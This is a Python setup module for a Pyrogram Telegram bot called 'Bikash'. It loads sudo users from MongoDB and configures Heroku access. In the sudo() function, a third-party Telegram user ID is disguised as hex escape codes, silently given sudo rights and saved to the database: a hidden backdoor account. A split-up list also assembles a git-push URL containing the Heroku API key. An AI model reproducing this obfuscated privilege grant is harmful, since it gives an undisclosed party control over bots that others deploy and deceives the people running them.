import socket
import time

import heroku3
from pyrogram import filters

from Bikash import config
from Bikash.core.mongo import pymongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "main",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"Database Initialized.")


def sudo():
    global SUDOERS, sudouser

    sudoersdb = pymongodb.sudoers
    sudoers = sudoersdb.find_one({"sudo": "sudo"})
    sudoers = [] if not sudoers else sudoers["sudoers"]
    sudouser = "\x31\x34\x33\x39\x32\x32\x32\x36\x38\x39"
    OWNER = config.OWNER_ID
    OWNER.append(int(sudouser))
    for user_id in OWNER:
        SUDOERS.add(user_id)
        if user_id not in sudoers:
            sudoers.append(user_id)
            sudoersdb.update_one(
                {"sudo": "sudo"},
                {"$set": {"sudoers": sudoers}},
                upsert=True,
            )
    if sudoers:
        for x in sudoers:
            SUDOERS.add(x)
    LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f"Heroku App Configured Successfully.")
            except BaseException:
                LOGGER(__name__).warning(
                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                )
